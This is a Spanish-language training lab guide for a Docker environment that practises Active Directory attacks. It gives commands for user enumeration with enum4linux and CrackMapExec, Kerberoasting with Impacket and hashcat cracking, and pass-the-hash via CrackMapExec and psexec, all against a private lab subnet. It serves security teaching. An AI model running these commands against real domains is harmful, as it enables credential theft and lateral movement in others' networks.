# 🦸 Unit 4: Hacking de Identidad y AD - LAB PRÁCTICO

## 🎯 Objetivos

Practicar **ataques a Active Directory**:

1. **Kerberoasting** - Extraer tickets TGS
2. **Pass-the-Hash** - Movimiento lateral
3. **DCSync** - Extracción de hashes
4. **Enumeration** - Descubrir usuarios y recursos

---

## 🏗️ Arquitectura

```
┌──────────────────────────────────────────────────────────────────┐
│                      LABORATORIO 4                                │
│                 HACKING DE IDENTIDAD Y AD                          │
├──────────────────────────────────────────────────────────────────┤
│   ┌─────────────┐                            ┌─────────────┐      │
│   │    KALI    │        ATAQUE              │   OBJETOS   │      │
│   │   LINUX    │  ──────────────────────→    │     AD      │      │
│   │ (Atacante) │                            │             │      │
│   └─────────────┘                            └─────────────┘      │
│        │                                            │              │
│        │  • Impacket                            │              │
│        │  • CrackMapExec                       │              │
│        │  • BloodHound                        │              │
│        │  • enum4linux                       │              │
│        │        ┌─────────────┐               │              │
│        │        │   OpenLDAP │               │              │
│        │        │   :389     │               │              │
│        │        └─────────────┘               │              │
│        │            RED: 192.168.59.0/24  │              │
└────────┼──────────────────────────────────────┼──────────────┘
         │
    SSH:2222
```

---

## 🚀 Iniciar

```bash
cd docker-labs/unit4
docker-compose up -d
```

---

## ⚔️ EJERCICIOS DE ATAQUE

### Ejercicio 1: Enumeración AD

```bash
ssh root@localhost -p 2222

# Enumerar usuarios
enum4linux 192.168.59.x

# CrackMapExec
crackmapexec smb 192.168.59.x -u '' -p '' --users
```

### Ejercicio 2: Kerberoasting

```bash
# Obtener tickets TGS
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py pentestlab.local/user:password -request

# Crackear con Hashcat
hashcat -m 13100 hash.txt wordlist.txt
```

### Ejercicio 3: Pass-the-Hash

```bash
# Con CrackMapExec
crackmapexec smb 192.168.59.x -u admin -H aad3b435b51404eeaad3b435b51404ee

# Con psexec
python3 /usr/share/doc/python3-impacket/examples/psexec.py pentestlab.local/admin@192.168.59.x -hashes aad3b435b51404eeaad3b435b51404ee
```

---

## 🛑 Cleanup

```bash
docker-compose down -v
```
